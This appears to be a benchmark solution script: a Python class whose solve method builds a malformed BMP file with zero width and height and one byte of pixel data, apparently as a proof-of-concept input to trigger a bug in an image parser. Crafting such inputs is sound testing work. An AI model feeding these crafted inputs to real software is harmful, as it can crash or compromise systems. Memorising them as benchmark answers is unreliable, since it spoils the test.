import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        biSizeImage = 1
        pixel_data = b'\x41' * biSizeImage
        bfSize = 54 + biSizeImage
        header = (
            b'BM' +
            struct.pack('<I', bfSize) +
            struct.pack('<I', 0) +
            struct.pack('<I', 0) +
            struct.pack('<I', 54)
        )
        info = (
            struct.pack('<I', 40) +
            struct.pack('<i', 0) +
            struct.pack('<i', 0) +
            struct.pack('<H', 1) +
            struct.pack('<H', 24) +
            struct.pack('<I', 0) +
            struct.pack('<I', biSizeImage) +
            struct.pack('<I', 0) +
            struct.pack('<I', 0) +
            struct.pack('<I', 0) +
            struct.pack('<I', 0)
        )
        return header + info + pixel_data
